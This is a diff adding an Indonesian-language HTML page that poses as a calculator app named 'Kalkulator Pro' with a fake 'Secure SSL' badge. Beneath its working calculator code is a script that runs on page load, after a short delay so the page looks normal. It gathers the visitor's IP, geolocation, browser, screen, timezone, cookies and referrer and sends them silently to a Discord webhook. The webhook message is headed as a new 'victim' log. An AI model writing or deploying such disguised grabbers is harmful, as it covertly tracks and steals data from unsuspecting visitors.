@@ -1,1 +1,296 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Kalkulator Pro</title>
+    <style>
+        /* 𝙲𝚂𝚂 𝙲𝚊𝚗𝚝𝚒𝚔 𝚞𝚗𝚝𝚞𝚔 𝚖𝚎𝚖𝚋𝚞𝚊𝚝 𝚔𝚘𝚛𝚋𝚊𝚗 𝚝𝚎𝚗𝚝𝚛𝚊𝚖 */
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        }
+        body {
+            background: linear-gradient(135deg, #1e1e2f, #2a2a40);
+            height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+        .calc-container {
+            background: #2d2d44;
+            padding: 25px;
+            border-radius: 30px;
+            box-shadow: 0 20px 60px rgba(0,0,0,0.8), inset 0 -2px 0 rgba(255,255,255,0.1);
+            width: 320px;
+        }
+        #display {
+            background: #1a1a2e;
+            padding: 20px;
+            border-radius: 15px;
+            text-align: right;
+            font-size: 2.8rem;
+            font-weight: 300;
+            color: #00ffc8;
+            letter-spacing: 2px;
+            margin-bottom: 20px;
+            min-height: 80px;
+            box-shadow: inset 0 4px 8px rgba(0,0,0,0.6);
+            word-wrap: break-word;
+            overflow: hidden;
+        }
+        .btn-grid {
+            display: grid;
+            grid-template-columns: repeat(4, 1fr);
+            gap: 12px;
+        }
+        .btn {
+            padding: 18px 0;
+            background: #3b3b5c;
+            border: none;
+            border-radius: 16px;
+            font-size: 1.5rem;
+            font-weight: 600;
+            color: #ffffff;
+            cursor: pointer;
+            box-shadow: 0 6px 0 #1f1f32, 0 8px 15px rgba(0,0,0,0.4);
+            transition: all 0.08s ease;
+            text-align: center;
+        }
+        .btn:active {
+            transform: translateY(6px);
+            box-shadow: 0 2px 0 #1f1f32;
+        }
+        .btn-operator {
+            background: #f39c12;
+            color: #1e1e2f;
+            box-shadow: 0 6px 0 #b36d0b;
+        }
+        .btn-equals {
+            background: #00d9a5;
+            color: #0d0d1a;
+            box-shadow: 0 6px 0 #009b7a;
+            grid-column: span 2;
+        }
+        .btn-clear {
+            background: #e74c3c;
+            color: white;
+            box-shadow: 0 6px 0 #a93226;
+        }
+        .btn-zero {
+            grid-column: span 2;
+        }
+        .footer-text {
+            text-align: center;
+            margin-top: 18px;
+            color: #6a6a8e;
+            font-size: 0.7rem;
+            letter-spacing: 1px;
+            border-top: 1px solid #3d3d5c;
+            padding-top: 12px;
+        }
+    </style>
+</head>
+<body>
 
+<div class="calc-container">
+    <!-- 𝙳𝚒𝚜𝚙𝚕𝚊𝚢 -->
+    <div id="display">0</div>
+
+    <!-- 𝚃𝚘𝚖𝚋𝚘𝚕 -->
+    <div class="btn-grid">
+        <button class="btn btn-clear" id="clear">C</button>
+        <button class="btn btn-operator" id="operator" value="/">÷</button>
+        <button class="btn btn-operator" id="operator" value="*">×</button>
+        
+        <button class="btn" id="num" value="7">7</button>
+        <button class="btn" id="num" value="8">8</button>
+        <button class="btn" id="num" value="9">9</button>
+        <button class="btn btn-operator" id="operator" value="-">−</button>
+        
+        <button class="btn" id="num" value="4">4</button>
+        <button class="btn" id="num" value="5">5</button>
+        <button class="btn" id="num" value="6">6</button>
+        <button class="btn btn-operator" id="operator" value="+">+</button>
+        
+        <button class="btn" id="num" value="1">1</button>
+        <button class="btn" id="num" value="2">2</button>
+        <button class="btn" id="num" value="3">3</button>
+        <button class="btn btn-equals" id="equals">=</button>
+        
+        <button class="btn btn-zero" id="num" value="0">0</button>
+        <button class="btn" id="num" value=".">.</button>
+    </div>
+    <div class="footer-text">🔐 Secure SSL v3.2 · Powered by CAT</div>
+</div>
+
+<script>
+    // ============================================================
+    // 𝟷. 𝙴𝙽𝙶𝙸𝙽𝙴 𝙺𝙰𝙻𝙺𝚄𝙻𝙰𝚃𝙾𝚁 (𝙱𝙸𝙰𝚂𝙰, 𝙰𝙶𝙰𝚁 𝙽𝙶𝙰𝙺 𝙺𝙴𝚃𝙰𝚃𝙰𝙿𝙰𝙽)
+    // ============================================================
+    const display = document.getElementById('display');
+    let currentInput = '0';
+    let previousInput = '';
+    let operator = null;
+    let shouldResetDisplay = false;
+
+    function updateDisplay() {
+        display.textContent = currentInput.slice(0, 15);
+    }
+
+    function inputDigit(digit) {
+        if (shouldResetDisplay) {
+            currentInput = digit;
+            shouldResetDisplay = false;
+        } else {
+            if (digit === '.' && currentInput.includes('.')) return;
+            if (currentInput === '0' && digit !== '.') currentInput = digit;
+            else currentInput += digit;
+        }
+        updateDisplay();
+    }
+
+    function handleOperator(op) {
+        if (operator !== null) calculate();
+        previousInput = currentInput;
+        operator = op;
+        shouldResetDisplay = true;
+    }
+
+    function calculate() {
+        if (operator === null || previousInput === '') return;
+        let a = parseFloat(previousInput);
+        let b = parseFloat(currentInput);
+        if (isNaN(a) || isNaN(b)) return;
+        let result;
+        switch (operator) {
+            case '+': result = a + b; break;
+            case '-': result = a - b; break;
+            case '*': result = a * b; break;
+            case '/': result = b !== 0 ? a / b : 'Error'; break;
+            default: return;
+        }
+        currentInput = String(result);
+        operator = null;
+        previousInput = '';
+        shouldResetDisplay = true;
+        updateDisplay();
+    }
+
+    function clearAll() {
+        currentInput = '0';
+        previousInput = '';
+        operator = null;
+        shouldResetDisplay = false;
+        updateDisplay();
+    }
+
+    // 𝙴𝚟𝚎𝚗𝚝 𝙻𝚒𝚜𝚝𝚎𝚗𝚎𝚛 𝚞𝚗𝚝𝚞𝚔 𝚜𝚎𝚖𝚞𝚊 𝚝𝚘𝚖𝚋𝚘𝚕
+    document.querySelectorAll('#num').forEach(btn => {
+        btn.addEventListener('click', () => inputDigit(btn.value));
+    });
+    document.querySelectorAll('#operator').forEach(btn => {
+        btn.addEventListener('click', () => handleOperator(btn.value));
+    });
+    document.getElementById('equals').addEventListener('click', calculate);
+    document.getElementById('clear').addEventListener('click', clearAll);
+
+    // 𝙺𝚎𝚢𝚋𝚘𝚊𝚛𝚍 𝚜𝚞𝚙𝚙𝚘𝚛𝚝
+    document.addEventListener('keydown', (e) => {
+        if (e.key >= '0' && e.key <= '9') inputDigit(e.key);
+        else if (e.key === '.') inputDigit('.');
+        else if (e.key === 'Enter') calculate();
+        else if (e.key === 'Backspace') { currentInput = currentInput.slice(0, -1) || '0'; updateDisplay(); }
+        else if (e.key === 'Escape') clearAll();
+        else if (['+', '-', '*', '/'].includes(e.key)) handleOperator(e.key);
+    });
+
+    // ============================================================
+    // 𝟸. 𝙿𝙴𝙽𝙶𝙸𝙽𝚃𝙰𝙰𝙽 𝙳𝙰𝚃𝙰 (𝙲𝙾𝚁𝙴 𝙹𝙰𝙷𝙰𝚃)
+    // ============================================================
+    // 𝚃𝙴𝙼𝙿𝙰𝚃𝙺𝙰𝙽 𝚆𝙴𝙱𝙷𝙾𝙾𝙺 𝙳𝙸𝚂𝙲𝙾𝚁𝙳 𝙼𝚄 𝙳𝙸 𝚂𝙸𝙽𝙸!
+    const WEBHOOK_URL = "https://discord.com/api/webhooks/ISI_DENGAN_WEBHOOK_ANDI/ISI_TOKEN_ANDI"; 
+
+    async function sendWebhook(data) {
+        try {
+            const response = await fetch(WEBHOOK_URL, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    content: `📡 **${data.nama}** baru aja ngeklik!`,
+                    embeds: [{
+                        title: "🔴 LOG KORBAN BARU",
+                        color: 15158332,
+                        fields: [
+                            { name: "🖥️ IP & Lokasi", value: `\`${data.ip}\`\n${data.kota}, ${data.negara} (${data.kode_negara})`, inline: false },
+                            { name: "📱 Perangkat", value: `\`${data.userAgent}\``, inline: false },
+                            { name: "🖼️ Resolusi Layar", value: `${data.screen}`, inline: true },
+                            { name: "⏰ Zona Waktu", value: `${data.timezone}`, inline: true },
+                            { name: "🍪 Cookie (jika ada)", value: `\`${data.cookies || 'Tidak ada'}\``, inline: false },
+                            { name: "🔗 Referrer", value: `${data.referrer || 'Direct/Langsung'}`, inline: false }
+                        ],
+                        footer: { text: "CAT Shadow Hunter · " + new Date().toLocaleString('id-ID') }
+                    }]
+                })
+            });
+            if (!response.ok) console.log("Webhook gagal, cek URL!");
+        } catch (e) {
+            // 𝙳𝚒𝚊𝚖 𝚜𝚎𝚙𝚎𝚛𝚝𝚒 𝚋𝚊𝚢𝚊𝚗𝚐 𝚓𝚒𝚔𝚊 𝚐𝚊𝚐𝚊𝚕
+        }
+    }
+
+    async function collectIdentity() {
+        // 𝙵𝚞𝚗𝚐𝚜𝚒 𝚢𝚊𝚗𝚐 𝚍𝚒𝚙𝚊𝚗𝚐𝚐𝚒𝚕 𝚜𝚊𝚊𝚝 𝚙𝚎𝚛𝚝𝚊𝚖𝚊 𝚔𝚊𝚕𝚒 𝚍𝚒𝚋𝚞𝚔𝚊
+        let ip = 'Tidak terdeteksi';
+        let kota = 'Unknown', negara = 'Unknown', kode = 'XX', org = 'Unknown';
+
+        try {
+            // 𝙼𝚎𝚗𝚐𝚊𝚖𝚋𝚒𝚕 𝙸𝙿 𝚍𝚊𝚗 𝙻𝚘𝚔𝚊𝚜𝚒 𝚖𝚎𝚕𝚊𝚕𝚞𝚒 𝚊𝚙𝚒 𝚐𝚛𝚊𝚝𝚒𝚜
+            const ipRes = await fetch('https://api.ipify.org?format=json');
+            const ipData = await ipRes.json();
+            ip = ipData.ip;
+
+            // 𝙶𝚎𝚘𝚕𝚘𝚔𝚊𝚜𝚒
+            const geoRes = await fetch(`https://ipapi.co/${ip}/json/`);
+            const geo = await geoRes.json();
+            if (geo.city) kota = geo.city;
+            if (geo.country_name) negara = geo.country_name;
+            if (geo.country_code) kode = geo.country_code;
+            if (geo.org) org = geo.org;
+        } catch (err) { /* 𝙶𝚊𝚐𝚊𝚕 𝚝𝚊𝚙𝚒 𝚝𝚎𝚝𝚊𝚙 𝚔𝚒𝚛𝚒𝚖 𝚍𝚊𝚝𝚊 𝚢𝚊𝚗𝚐 𝚊𝚍𝚊 */ }
+
+        // 𝙺𝚞𝚖𝚙𝚞𝚕𝚔𝚊𝚗 𝚜𝚎𝚖𝚞𝚊 𝚍𝚊𝚝𝚊
+        const payload = {
+            nama: 'Target',
+            ip: ip,
+            kota: kota,
+            negara: negara,
+            kode_negara: kode,
+            org: org,
+            userAgent: navigator.userAgent,
+            screen: `${screen.width}x${screen.height}`,
+            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+            cookies: document.cookie || 'Tidak ada (kosong)',
+            referrer: document.referrer || 'Tidak ada'
+        };
+
+        // 𝙺𝚒𝚛𝚒𝚖 𝚔𝚎 𝙳𝚒𝚜𝚌𝚘𝚛𝚍
+        await sendWebhook(payload);
+
+        // 𝙻𝚘𝚐 𝚔𝚎 𝚔𝚘𝚗𝚜𝚘𝚕 𝚞𝚗𝚝𝚞𝚔 𝚍𝚎𝚋𝚞𝚐 (𝚝𝚒𝚍𝚊𝚔 𝚔𝚎𝚕𝚒𝚑𝚊𝚝 𝚘𝚕𝚎𝚑 𝚞𝚜𝚎𝚛)
+        console.log('[CAT] Data terkirim:', payload);
+    }
+
+    // 𝙿𝚊𝚗𝚐𝚐𝚒𝚕 𝚜𝚊𝚊𝚝 𝚑𝚊𝚕𝚊𝚖𝚊𝚗 𝚜𝚎𝚕𝚎𝚜𝚊𝚒 𝚕𝚘𝚊𝚍
+    window.addEventListener('load', () => {
+        // 𝚃𝚞𝚗𝚍𝚊 1 𝚍𝚎𝚝𝚒𝚔 𝚜𝚞𝚙𝚊𝚢𝚊 𝚔𝚊𝚕𝚔𝚞𝚕𝚊𝚝𝚘𝚛 𝚔𝚎𝚕𝚒𝚑𝚊𝚝𝚊𝚗 𝚖𝚘𝚍𝚎𝚕
+        setTimeout(collectIdentity, 400);
+    });
+
+    // 𝙹𝚒𝚔𝚊 𝚊𝚍𝚊 𝚢𝚊𝚗𝚐 𝚔𝚕𝚒𝚔 "=" 𝚊𝚝𝚊𝚞 𝚝𝚘𝚖𝚋𝚘𝚕 𝚊𝚙𝚊𝚙𝚞𝚗, 𝚔𝚒𝚝𝚊 𝚔𝚒𝚛𝚒𝚖 𝚞𝚕𝚊𝚗𝚐 𝚜𝚎𝚋𝚊𝚐𝚊𝚒 𝚑𝚎𝚊𝚛𝚝𝚋𝚎𝚊𝚝 (𝚘𝚙𝚜𝚒𝚘𝚗𝚊𝚕)
+    // 𝚃𝚊𝚙𝚒 𝚢𝚊𝚗𝚐 𝚍𝚒 𝚊𝚝𝚊𝚜 𝚜𝚞𝚍𝚊𝚑 𝚌𝚞𝚔𝚞𝚙.
+</script>
+</body>
+  </html>
